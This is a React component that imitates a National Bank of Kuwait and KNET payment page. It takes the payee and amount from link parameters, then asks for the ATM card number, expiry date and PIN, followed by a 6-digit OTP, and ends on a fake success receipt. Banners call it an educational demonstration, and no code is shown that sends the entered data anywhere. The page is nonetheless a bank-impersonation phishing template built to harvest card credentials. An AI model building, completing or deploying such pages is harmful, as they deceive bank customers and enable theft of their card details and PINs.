import { useState, useEffect } from "react";
import { Button } from "@/components/ui/button";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Input } from "@/components/ui/input";
import { AlertCircle } from "lucide-react";

type PageView = 'confirmation' | 'payment-form' | 'otp-verification' | 'success';

export default function NBKPaymentPage() {
  const [currentView, setCurrentView] = useState<PageView>('confirmation');
  const [otpCode, setOtpCode] = useState('');
  const [timeRemaining, setTimeRemaining] = useState(120); // 2 minutes
  
  // استخراج البيانات من URL إذا كانت متوفرة
  useEffect(() => {
    const urlParams = new URLSearchParams(window.location.search);
    const recipientFromUrl = urlParams.get('n');
    const amountFromUrl = urlParams.get('a');
    const purposeFromUrl = urlParams.get('p');
    
    if (recipientFromUrl && amountFromUrl && purposeFromUrl) {
      setPaymentInfo({
        recipientName: decodeURIComponent(recipientFromUrl),
        amount: amountFromUrl,
        currency: "د.ك",
        purpose: decodeURIComponent(purposeFromUrl),
        beneficiary: "NBK",
        website: "https://online.nbk.com.kw"
      });
    }
  }, []);

  // معلومات الدفع (القيم الافتراضية)
  const [paymentInfo, setPaymentInfo] = useState({
    recipientName: "يوسف غازي صلاح الرشيدي",
    amount: "30.000",
    currency: "د.ك",
    purpose: "Family Support",
    beneficiary: "NBK",
    website: "https://online.nbk.com.kw"
  });

  const renderConfirmationPage = () => (
    <div className="min-h-screen bg-white flex flex-col items-center justify-center px-4">
      {/* شعار NBK */}
      <div className="mb-8">
        <img src="/nbk-logo.jpg" alt="بنك الكويت الوطني" className="h-16" />
      </div>
      
      {/* عنوان الخدمة */}
      <h1 className="text-2xl font-bold text-blue-800 mb-8 text-center">
        خدمة الدفع السريع
      </h1>
      
      {/* معلومات الدفع */}
      <div className="w-full max-w-md bg-gray-50 border border-gray-300 rounded-lg p-6 mb-6">
        <div className="space-y-4 text-right">
          <div className="flex justify-between items-center">
            <span className="font-bold">{paymentInfo.recipientName}</span>
            <span className="text-gray-700">:اسم المستلم</span>
          </div>
          
          <div className="flex justify-between items-center">
            <span className="font-bold">{paymentInfo.amount} {paymentInfo.currency}</span>
            <span className="text-gray-700">:المبلغ</span>
          </div>
          
          <div className="flex justify-between items-center">
            <span className="font-bold">{paymentInfo.purpose}</span>
            <span className="text-gray-700">:الغرض</span>
          </div>
        </div>
      </div>
      
      {/* تنبيه مهم */}
      <div className="text-right text-sm text-gray-600 mb-8 max-w-md leading-relaxed">
        يرجى عدم إغلاق الصفحة بعد إتمام عملية الدفع لحين ظهور صفحة التأكيد التي تفيد بأن العملية ناجحة لتفادي أي مشاكل قد تنتج عن ذلك.
      </div>
      
      {/* أزرار التحكم */}
      <div className="flex flex-col gap-3 w-full max-w-md">
        <Button 
          onClick={() => setCurrentView('payment-form')}
          className="w-full bg-blue-700 hover:bg-blue-800 text-white py-3 text-lg rounded-lg"
        >
          تأكيد
        </Button>
        
        <Button 
          variant="outline"
          className="w-full border-gray-300 text-gray-700 py-3 text-lg rounded-lg"
          onClick={() => alert('تم رفض عملية الدفع')}
        >
          رفض
        </Button>
      </div>
      
      {/* تنبيه تعليمي */}
      <div className="mt-8 p-4 bg-yellow-50 border border-yellow-200 rounded-lg text-center max-w-md">
        <div className="flex items-center justify-center gap-2 text-yellow-800">
          <AlertCircle className="w-5 h-5" />
          <span className="font-semibold">تنبيه: هذا نموذج تعليمي</span>
        </div>
        <p className="text-sm text-yellow-700 mt-2">
          هذه النسخة مخصصة للأغراض التعليمية والعروض التقديمية فقط ولا تقوم بمعالجة دفعات حقيقية
        </p>
      </div>
    </div>
  );

  const renderPaymentForm = () => (
    <div className="min-h-screen bg-gradient-to-b from-blue-50 to-white flex flex-col items-center justify-center px-4">
      <div className="w-full max-w-md bg-white border-2 border-blue-200 rounded-lg shadow-lg p-8">
        {/* شعار NBK */}
        <div className="flex justify-center mb-6">
          <img src="/nbk-logo.jpg" alt="بنك الكويت الوطني" className="h-12" />
        </div>
        
        <hr className="border-gray-300 mb-6" />
        
        {/* معلومات العامة */}
        <div className="mb-8">
          <h2 className="text-lg font-bold text-blue-800 mb-4 text-center">معلومات العامرة</h2>
          
          <div className="space-y-3 text-right text-sm">
            <div className="flex justify-between">
              <span className="font-semibold">{paymentInfo.beneficiary}</span>
              <span className="text-gray-700">:المستفيد</span>
            </div>
            
            <div className="flex justify-between">
              <span className="font-semibold text-xs">{paymentInfo.website}</span>
              <span className="text-gray-700">:العنوان</span>
            </div>
            
            <div className="flex justify-between">
              <span className="font-semibold">KD {paymentInfo.amount}</span>
              <span className="text-gray-700">:المبلغ</span>
            </div>
          </div>
        </div>
        
        {/* معلومات البطاقة */}
        <div className="mb-8">
          <h2 className="text-lg font-bold text-blue-800 mb-4 text-center">معلومات البطاقة</h2>
          
          <div className="space-y-4 text-right">
            <div>
              <label className="block text-sm text-gray-700 mb-2">:يرجى اختيار البنك</label>
              <Select>
                <SelectTrigger className="w-full text-right">
                  <SelectValue placeholder="يرجى اختيار البنك" />
                </SelectTrigger>
                <SelectContent>
                  <SelectItem value="nbk">بنك الكويت الوطني</SelectItem>
                  <SelectItem value="cbk">البنك التجاري الكويتي</SelectItem>
                  <SelectItem value="gbk">بنك الخليج</SelectItem>
                  <SelectItem value="ahli">البنك الأهلي الكويتي</SelectItem>
                </SelectContent>
              </Select>
            </div>
            
            <div>
              <label className="block text-sm text-gray-700 mb-2">:رقم بطاقة الصرف الآلي</label>
              <Input 
                type="password" 
                placeholder="ابانة" 
                className="w-full text-right"
              />
            </div>
            
            <div className="flex gap-3">
              <div className="flex-1">
                <label className="block text-sm text-gray-700 mb-2">:تاريخ انتهاء البطاقة</label>
                <div className="flex gap-2">
                  <Select>
                    <SelectTrigger className="flex-1">
                      <SelectValue placeholder="MM" />
                    </SelectTrigger>
                    <SelectContent>
                      {Array.from({length: 12}, (_, i) => (
                        <SelectItem key={i+1} value={String(i+1).padStart(2, '0')}>
                          {String(i+1).padStart(2, '0')}
                        </SelectItem>
                      ))}
                    </SelectContent>
                  </Select>
                  
                  <Select>
                    <SelectTrigger className="flex-1">
                      <SelectValue placeholder="YYYY" />
                    </SelectTrigger>
                    <SelectContent>
                      {Array.from({length: 10}, (_, i) => (
                        <SelectItem key={2025+i} value={String(2025+i)}>
                          {2025+i}
                        </SelectItem>
                      ))}
                    </SelectContent>
                  </Select>
                </div>
              </div>
            </div>
            
            <div>
              <label className="block text-sm text-gray-700 mb-2">:الرقم السري</label>
              <Input 
                type="password" 
                className="w-full text-center bg-blue-50" 
                maxLength={4}
              />
            </div>
          </div>
        </div>
        
        {/* أزرار التحكم */}
        <div className="flex gap-3">
          <Button 
            variant="destructive"
            className="flex-1"
            onClick={() => setCurrentView('confirmation')}
          >
            إلغاء
          </Button>
          
          <Button 
            variant="outline"
            className="flex-1"
            onClick={() => {
              // إعادة تعيين النموذج
              const form = document.querySelector('form');
              form?.reset();
            }}
          >
            إعادة
          </Button>
          
          <Button 
            className="flex-1 bg-blue-700 hover:bg-blue-800"
            onClick={() => {
              // التحقق من ملء البيانات
              setCurrentView('otp-verification');
            }}
          >
            إرسال
          </Button>
        </div>
      </div>
      
      {/* حقوق الطبع */}
      <div className="mt-8 text-center text-xs text-gray-600">
        <p>جميع الحقوق محفوظة © 2025</p>
        <p className="text-blue-600">شركة الخدمات المصرفية الآلية المشتركة - كي نت</p>
      </div>
      
      {/* تنبيه تعليمي */}
      <div className="mt-4 p-4 bg-yellow-50 border border-yellow-200 rounded-lg text-center max-w-md">
        <div className="flex items-center justify-center gap-2 text-yellow-800">
          <AlertCircle className="w-5 h-5" />
          <span className="font-semibold">تنبيه: هذا نموذج تعليمي</span>
        </div>
        <p className="text-sm text-yellow-700 mt-2">
          هذه النسخة مخصصة للأغراض التعليمية والعروض التقديمية فقط
        </p>
      </div>
    </div>
  );

  const renderOTPVerification = () => (
    <div className="min-h-screen bg-gradient-to-b from-blue-50 to-white flex flex-col items-center justify-center px-4">
      <div className="w-full max-w-md bg-white border-2 border-blue-200 rounded-lg shadow-lg p-8">
        {/* شعار NBK */}
        <div className="flex justify-center mb-6">
          <img src="/nbk-logo.jpg" alt="بنك الكويت الوطني" className="h-12" />
        </div>
        
        <hr className="border-gray-300 mb-6" />
        
        {/* عنوان رمز التحقق */}
        <div className="text-center mb-8">
          <h2 className="text-xl font-bold text-blue-800 mb-4">رمز التحقق</h2>
          <p className="text-gray-600 text-sm mb-6">
            لقد تم إرسال رمز التحقق إلى هاتفك المحمول<br />
            يرجى إدخال الرمز المكون من 6 أرقام
          </p>
        </div>
        
        {/* حقول رمز التحقق */}
        <div className="mb-6">
          <div className="flex gap-2 justify-center mb-4">
            {[...Array(6)].map((_, index) => (
              <Input
                key={index}
                type="text"
                maxLength={1}
                className="w-12 h-12 text-center text-xl font-bold border-2 border-gray-300 focus:border-blue-500"
                onChange={(e) => {
                  const value = e.target.value;
                  if (value && index < 5) {
                    const nextInput = e.target.parentElement?.children[index + 1] as HTMLInputElement;
                    nextInput?.focus();
                  }
                  const newOtp = otpCode.split('');
                  newOtp[index] = value;
                  setOtpCode(newOtp.join(''));
                }}
              />
            ))}
          </div>
          
          {/* عداد زمني */}
          <div className="text-center text-sm text-gray-600 mb-4">
            الوقت المتبقي: {Math.floor(timeRemaining / 60)}:{(timeRemaining % 60).toString().padStart(2, '0')}
          </div>
          
          {/* زر إعادة الإرسال */}
          <div className="text-center">
            <Button 
              variant="link" 
              className="text-blue-600 text-sm"
              onClick={() => {
                setTimeRemaining(120);
                alert('تم إعادة إرسال رمز التحقق');
              }}
            >
              إعادة إرسال الرمز
            </Button>
          </div>
        </div>
        
        {/* أزرار التحكم */}
        <div className="flex gap-3">
          <Button 
            variant="outline"
            className="flex-1"
            onClick={() => setCurrentView('payment-form')}
          >
            رجوع
          </Button>
          
          <Button 
            className="flex-1 bg-blue-700 hover:bg-blue-800"
            onClick={() => {
              if (otpCode.length === 6) {
                setCurrentView('success');
              } else {
                alert('يرجى إدخال رمز التحقق كاملاً');
              }
            }}
          >
            تأكيد
          </Button>
        </div>
      </div>
      
      {/* تنبيه تعليمي */}
      <div className="mt-8 p-4 bg-yellow-50 border border-yellow-200 rounded-lg text-center max-w-md">
        <div className="flex items-center justify-center gap-2 text-yellow-800">
          <AlertCircle className="w-5 h-5" />
          <span className="font-semibold">تنبيه: هذا نموذج تعليمي</span>
        </div>
        <p className="text-sm text-yellow-700 mt-2">
          أي رمز من 6 أرقام سيعمل لأغراض العرض
        </p>
      </div>
    </div>
  );

  const renderSuccessPage = () => (
    <div className="min-h-screen bg-gradient-to-b from-green-50 to-white flex flex-col items-center justify-center px-4">
      <div className="w-full max-w-md bg-white border-2 border-green-200 rounded-lg shadow-lg p-8">
        {/* شعار NBK */}
        <div className="flex justify-center mb-6">
          <img src="/nbk-logo.jpg" alt="بنك الكويت الوطني" className="h-12" />
        </div>
        
        <hr className="border-gray-300 mb-6" />
        
        {/* رمز النجاح */}
        <div className="text-center mb-8">
          <div className="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4">
            <svg className="w-10 h-10 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
            </svg>
          </div>
          
          <h2 className="text-xl font-bold text-green-800 mb-2">تمت العملية بنجاح</h2>
          <p className="text-gray-600 text-sm">
            لقد تم تنفيذ عملية الدفع بنجاح
          </p>
        </div>
        
        {/* تفاصيل العملية */}
        <div className="bg-gray-50 border border-gray-200 rounded-lg p-4 mb-6">
          <div className="space-y-3 text-right text-sm">
            <div className="flex justify-between">
              <span className="font-semibold">{paymentInfo.recipientName}</span>
              <span className="text-gray-700">:اسم المستلم</span>
            </div>
            
            <div className="flex justify-between">
              <span className="font-semibold">{paymentInfo.amount} {paymentInfo.currency}</span>
              <span className="text-gray-700">:المبلغ</span>
            </div>
            
            <div className="flex justify-between">
              <span className="font-semibold">{paymentInfo.purpose}</span>
              <span className="text-gray-700">:الغرض</span>
            </div>
            
            <hr className="border-gray-300" />
            
            <div className="flex justify-between">
              <span className="font-semibold">REF{Date.now().toString().slice(-8)}</span>
              <span className="text-gray-700">:رقم المرجع</span>
            </div>
            
            <div className="flex justify-between">
              <span className="font-semibold">{new Date().toLocaleDateString('ar-KW')}</span>
              <span className="text-gray-700">:التاريخ</span>
            </div>
            
            <div className="flex justify-between">
              <span className="font-semibold">{new Date().toLocaleTimeString('ar-KW')}</span>
              <span className="text-gray-700">:الوقت</span>
            </div>
          </div>
        </div>
        
        {/* أزرار التحكم */}
        <div className="flex gap-3">
          <Button 
            variant="outline"
            className="flex-1"
            onClick={() => {
              navigator.share && navigator.share({
                title: 'إيصال الدفع',
                text: `تم دفع ${paymentInfo.amount} ${paymentInfo.currency} لـ ${paymentInfo.recipientName}`
              });
            }}
          >
            مشاركة
          </Button>
          
          <Button 
            variant="outline"
            className="flex-1"
            onClick={() => window.print()}
          >
            طباعة
          </Button>
          
          <Button 
            className="flex-1 bg-blue-700 hover:bg-blue-800"
            onClick={() => setCurrentView('confirmation')}
          >
            عملية جديدة
          </Button>
        </div>
      </div>
      
      {/* تنبيه تعليمي */}
      <div className="mt-8 p-4 bg-green-50 border border-green-200 rounded-lg text-center max-w-md">
        <div className="flex items-center justify-center gap-2 text-green-800">
          <AlertCircle className="w-5 h-5" />
          <span className="font-semibold">تنبيه: هذا نموذج تعليمي</span>
        </div>
        <p className="text-sm text-green-700 mt-2">
          لم يتم تنفيذ أي دفع حقيقي - هذه محاكاة فقط
        </p>
      </div>
    </div>
  );

  const renderCurrentPage = () => {
    switch (currentView) {
      case 'confirmation':
        return renderConfirmationPage();
      case 'payment-form':
        return renderPaymentForm();
      case 'otp-verification':
        return renderOTPVerification();
      case 'success':
        return renderSuccessPage();
      default:
        return renderConfirmationPage();
    }
  };

  return (
    <div className="font-sans">
      {renderCurrentPage()}
    </div>
  );
}
